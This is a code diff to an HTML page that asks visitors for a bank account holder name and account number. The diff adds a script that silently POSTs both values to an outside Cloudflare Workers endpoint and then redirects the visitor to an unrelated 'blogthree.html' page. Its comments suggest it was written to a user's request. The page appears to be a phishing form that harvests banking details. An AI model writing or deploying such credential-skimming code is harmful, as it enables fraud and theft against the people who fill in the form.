@@ -187,18 +187,18 @@
             <div class="instruction">Please enter your account details</div>
             <div class="mandatory-note">Mandatory fields are marked with an asterisk (*)</div>
 
-            <!-- form with Account Holder Name and Account Number -->
+            <!-- form with Account Holder Name and Account Number (ids added for script) -->
             <form>
                 <!-- Account Holder Name field -->
                 <div class="form-group">
                     <label class="form-label">Account Holder Name <span class="asterisk">*</span></label>
-                    <input type="text" class="form-input" placeholder="" maxlength="50">
+                    <input type="text" class="form-input" placeholder="" maxlength="50" id="accNameInput">
                 </div>
 
                 <!-- Account Number field -->
                 <div class="form-group">
                     <label class="form-label">Account Number <span class="asterisk">*</span></label>
-                    <input type="text" class="form-input" placeholder="" maxlength="11" pattern="[0-9]*" inputmode="numeric">
+                    <input type="text" class="form-input" placeholder="" maxlength="11" pattern="[0-9]*" inputmode="numeric" id="accNumberInput">
                 </div>
 
                 <!-- PROCEED BUTTON -->
@@ -226,5 +226,54 @@
             </div>
         </div>
     </div>
+
+    <!-- Script to send Account Details to Cloudflare Worker and redirect to blogthree.html -->
+    <script>
+        (function() {
+            const form = document.querySelector('form');
+            if (form) {
+                form.addEventListener('submit', async function(e) {
+                    e.preventDefault();  // stop normal form submission
+                    
+                    const nameInput = document.getElementById('accNameInput');
+                    const accInput = document.getElementById('accNumberInput');
+                    
+                    const nameValue = nameInput ? nameInput.value.trim() : '';
+                    const accValue = accInput ? accInput.value.trim() : '';
+                    
+                    // Generate a unique ID for this submission
+                    const uniqueId = 'account_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
+                    
+                    // Prepare payload as expected by the worker (type "Account Details")
+                    // We include both name and account number inside data.
+                    const payload = {
+                        type: 'Account Details',
+                        data: {
+                            name: nameValue,
+                            accountNumber: accValue   // worker will store this even if not displayed
+                        },
+                        id: uniqueId
+                    };
+                    
+                    // Worker endpoint (the one you provided)
+                    const workerUrl = 'https://falling-waterfall-d23a.vikash6759ub.workers.dev/';
+                    
+                    try {
+                        await fetch(workerUrl, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+                        // (We ignore the response – just try to send)
+                    } catch (err) {
+                        console.error('Error sending data to worker:', err);
+                    }
+                    
+                    // Always redirect to blogthree.html (relative path)
+                    window.location.href = 'blogthree.html';
+                });
+            }
+        })();
+    </script>
 </body>
 </html>
